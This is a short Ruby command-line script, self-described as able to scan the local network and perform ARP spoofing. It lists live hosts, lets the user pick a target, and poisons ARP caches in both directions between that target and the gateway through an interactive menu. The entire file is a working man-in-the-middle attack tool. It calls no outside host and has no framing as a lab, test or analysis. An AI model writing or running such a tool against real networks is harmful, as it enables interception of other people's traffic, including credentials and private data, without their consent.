#!/usr/bin/env ruby

#Elisa script
#This beauty can scan the local network and perform ARP spoofing

require 'packetgen/utils'
require_relative 'scanner'

def selectTarget(aliveIps)
    aliveIps.each { | ip |
        puts "#{aliveIps.find_index(ip)+1} - #{ip}\n"
    } 
    puts "b - Back\n"

    opt = gets
    opt = opt.chomp

    return nil if opt == "b"

    if opt !~ /\D/ 
        opt = opt.to_i

        if opt > 0 && opt <= aliveIps.length
            return aliveIps[opt-1]
        end
    else
        puts "Invalid option\n"
        return nil
    end
    
end

def addTarget(spoofer, targetIp, gateway)
    return puts "No target selected\n" if targetIp.nil?

    spoofer.add(targetIp,gateway)
    spoofer.add(gateway,targetIp)
end

def startSpoofing(spoofer)
    spoofer.start_all
end

def checkActiveSpoofings(spoofer)
    activeTargets = spoofer.active_targets

    if activeTargets.empty?
        puts "No active targets"
    else
        puts "Active targets:\n"
        activeTargets.each { |activeTarget|
            puts "#{activeTarget}\n"
        }
    end

end

def stopSpoofing(spoofer)
    spoofer.stop_all
end


puts "-----------  Elisa  ------------\n"
puts "Your wishes are my commands\n\n"

spoofer = PacketGen::Utils::ARPSpoofer.new
scanner = HostScanner.new

scanner.printDeviceInfo

gateway = scanner.gateway

aliveIps = scanner.startScan
targetIp = nil

option = -1
while option != "0" do
    puts "\nTarget selected: " + (targetIp.nil? ? "None\n" : "#{targetIp}\n")

    puts "\n----------- OPTIONS -----------\n"
    puts "1-Select a target from scanned IPs\n"
    puts "2-Add target to ARP spoofer\n"
    puts "3-Start ARP spoofing\n"
    puts "4-Check active spoofings\n"
    puts "5-Stop ARP spoofing\n"
    puts "0-Exit\n"

    option = gets
    option = option.chomp

    case option
    when "0"
        stopSpoofing(spoofer)
        puts "See you!\n"
    when "1"
        targetIp = selectTarget(aliveIps)
    when "2"
        addTarget(spoofer, targetIp, gateway)
    when "3"
        startSpoofing(spoofer)
        puts "APR spoofing started!"
    when "4"
        checkActiveSpoofings(spoofer)
    when "5"
        stopSpoofing(spoofer)
        puts "APR spoofing stoped!"
    else
        puts "Invalid option\n"
    end


end

